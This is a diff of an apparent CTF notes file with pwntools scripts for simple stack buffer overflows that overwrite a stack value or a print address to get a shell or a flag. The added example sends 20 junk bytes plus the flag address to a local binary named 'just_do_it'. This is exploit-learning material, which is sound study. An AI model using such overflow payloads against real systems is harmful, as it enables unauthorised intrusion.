@@ -2,6 +2,10 @@
 
 Examples of simple buffer owverflows to edit a stack value and get a shell or flag  
 
+---
+
+A check is made to see if a stack value has changed after our input is received  
+
 ```python3
 #!/usr/bin/env python3
 from pwn import *
@@ -16,6 +20,10 @@ io.recv()                       # Run the program and receive lines
 io.send(payload)                # Send the payload
 io.interactive()                # Interact with the shell
 ```
+
+---
+
+Same principal as above  
 
 ```python3
 from pwn import *
@@ -36,4 +44,27 @@ io.sendline(payload)
 
 # Win
 io.recv()
+```
+
+---
+
+The flag is read from a file and stored on the stack. We can overwrite the address that is called to print to the screen  
+
+```python3
+from pwn import *
+
+# RET2 Flag location
+# Flag at 0x804a080
+
+context.log_level="debug"
+io = process("./just_do_it")
+
+# payload = b"P@SSW0RD\x00"
+junk = b"\x00" * 20
+addr = p32(0x804a080)
+payload = junk + addr
+io.sendline(payload)
+
+# Win
+io.interactive()
 ```
